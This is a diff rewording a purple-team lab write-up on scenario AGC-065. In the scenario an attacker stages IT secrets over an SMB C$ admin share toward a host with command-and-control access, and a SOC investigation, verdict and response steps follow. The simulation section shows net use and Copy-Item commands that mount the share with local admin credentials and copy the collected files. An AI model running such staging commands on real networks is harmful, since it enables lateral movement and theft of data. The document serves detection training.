@@ -21,17 +21,17 @@
 
 ### Tradecraft
 
-**What:** After compromising one host, attackers laterally collect data from other hosts and consolidate it on a single machine with external connectivity for exfiltration. This two-stage pattern:
-1. **Internal staging:** Copy sensitive data from multiple hosts to one consolidation point via SMB
+**What:** The attacker pulls data from a second host onto the one machine that already talks to the outside, then uploads from there. Two stages:
+1. **Internal staging:** Copy sensitive data from other hosts to one consolidation point over SMB
 2. **External exfiltration:** Upload the consolidated data from the externally-connected host (AGC-062)
 
 **Why an Attacker Uses It Here:**
 - WIN-CLIENT-02 (raj.patel, IT-Support) has access to IT-sensitive files that the compromised account (michael.chen) may not
 - COMPROMISED-HOST-01 has established C2 connectivity to 10.10.40.10 (AGC-051/055/056/062)
-- Consolidating data on the externally-connected host avoids needing to establish new C2 channels from other hosts
-- The `C$` admin share provides write access to the entire filesystem without requiring a user-shared folder
+- Consolidating on the externally-connected host means no other host needs its own C2 channel
+- The `C$` admin share gives write access to the whole filesystem without any user-shared folder
 
-**Destination awareness:** The critical investigative insight is that the transfer destination is not arbitrary — it specifically targets the host known to have external connectivity. This transforms "unusual internal file transfer" into "staging data for exfiltration."
+**Destination awareness:** The destination is not random; it is the one host known to reach 10.10.40.10. That turns "unusual internal file transfer" into "staging data for exfiltration."
 
 ### Simulation
 
@@ -49,9 +49,9 @@ net use \\10.10.10.103\C$ /user:wadmin [REDACTED]
 Copy-Item -Path "C:\Windows\Temp\agc065_collected\*" -Destination "\\10.10.10.103\C$\Windows\Temp\agc065_incoming\" -Recurse
 ```
 
-**Result:** SMB connection failed with error 67 ("The network name cannot be found") — admin shares (C$) are not accessible between lab endpoints. The net.exe process with cleartext credentials was captured by Sysmon EID 1.
+**Result:** The SMB connection failed with error 67 ("The network name cannot be found"); admin shares (C$) are not reachable between lab endpoints. Sysmon EID 1 captured the net.exe process, cleartext credentials included.
 
-**Lab constraint:** Admin shares (C$, ADMIN$) are blocked between endpoints in this lab configuration. In a production Active Directory environment with local admin credentials, C$ access would succeed.
+**Lab constraint:** Admin shares (C$, ADMIN$) are blocked between endpoints in the lab. In a production Active Directory domain, local admin credentials would open C$.
 
 ## SOC Perspective
 
@@ -70,7 +70,7 @@ IntegrityLevel: High
 Hashes: MD5=8A1E71312BD2AAE202652113049CDBD1
 ```
 
-**Critical finding:** Local admin credentials (`wadmin` / `[REDACTED]`) exposed in cleartext in the CommandLine field. Same credential exposure pattern as AGC-060.
+**Critical finding:** The CommandLine field carries the local admin credentials (`wadmin` / `[REDACTED]`) in cleartext, the same exposure seen in AGC-060.
 
 **Sysmon EID 1 — PowerShell orchestration:**
 ```
@@ -84,7 +84,7 @@ User: WIN-CLIENT-02\Administrator
 ```
 
 **Sysmon EID 3 — Network Connection: 0 events**
-SMB connections by net.exe are filtered by SwiftOnSecurity Sysmon config (consistent gap).
+The SwiftOnSecurity Sysmon config filters SMB connections from net.exe, a detection gap seen throughout the lab.
 
 ### Investigation
 
@@ -93,7 +93,7 @@ The transfer targets `\\10.10.10.103\C$` — COMPROMISED-HOST-01. This host has 
 - C2 beacon to 10.10.40.10 (AGC-051/055/056)
 - Successful HTTPS exfiltration (AGC-062)
 - DNS tunneling exfiltration (AGC-063)
-An internal transfer to this specific host is not routine file sharing — it is staging data on the exfiltration endpoint.
+An internal transfer to that host is not routine file sharing; it is staging on the exfiltration endpoint.
 
 **Step 2 — Source data sensitivity assessment:**
 The 6 files prepared for transfer are IT infrastructure secrets:
@@ -104,22 +104,22 @@ The 6 files prepared for transfer are IT infrastructure secrets:
 - Firewall-Rules-Export.csv: Firewall rules with NAT entries
 - SIEM-API-Keys.json: Wazuh and Security Onion API keys
 
-This is the IT-Support role's most sensitive data — exfiltration would compromise the entire network infrastructure.
+Losing these would hand the attacker the VPN keys, the admin vault, the firewall rules, and the SIEM API keys in one go.
 
 **Step 3 — Credential assessment:**
-The `wadmin` account is a local admin account shared across all Windows endpoints. Using it to mount C$ admin shares demonstrates lateral movement capability. The cleartext password in the CommandLine is a secondary finding.
+`wadmin` is a local admin account shared across all Windows endpoints. Mounting C$ with it shows the attacker can move laterally. The cleartext password in the CommandLine is a secondary finding.
 
 **Step 4 — Attack chain completion:**
 ```
 WIN-CLIENT-02 (IT data) --[SMB C$]--> COMPROMISED-HOST-01 --[HTTPS/DNS]--> 10.10.40.10
 ```
-Even though the SMB transfer failed, the intent chain is clear: consolidate IT infrastructure data on the externally-connected host for exfiltration.
+The SMB transfer failed, but the intent reads plainly: consolidate IT infrastructure data on the externally-connected host, then upload it.
 
 ### Report
 
 **Verdict: True Positive** — Internal SMB transfer attempt staging data toward externally-connected host.
 
-**Confidence: High** — The destination awareness (COMPROMISED-HOST-01 has C2 connectivity) elevates this above a generic "unusual internal transfer":
+**Confidence: High** — the destination (COMPROMISED-HOST-01, with live C2) lifts this above a generic "unusual internal transfer":
 1. Destination host has confirmed C2 and exfiltration capability
 2. Source data is IT infrastructure secrets (network diagrams, admin credentials, firewall rules)
 3. `wadmin` credential usage indicates lateral movement
@@ -128,8 +128,8 @@ Even though the SMB transfer failed, the intent chain is clear: consolidate IT i
 **Response recommendation:**
 1. **Isolate both hosts** — WIN-CLIENT-02 (source of IT secrets) and COMPROMISED-HOST-01 (confirmed C2)
 2. **Rotate the `wadmin` local admin password** across all endpoints immediately — it was exposed in cleartext
-3. **Audit COMPROMISED-HOST-01** for any data that successfully arrived from other hosts
-4. **Review internal SMB traffic** — alert on any C$ or ADMIN$ access between workstations (this should not occur in normal operations)
+3. **Audit COMPROMISED-HOST-01** for any data that did arrive from other hosts
+4. **Review internal SMB traffic** — alert on any C$ or ADMIN$ access between workstations (workstations have no business reason to open each other's admin shares)
 5. **Implement network segmentation** — restrict SMB (445/TCP) between workstations by default; only allow workstation-to-server SMB
 
 ### MITRE Mapping
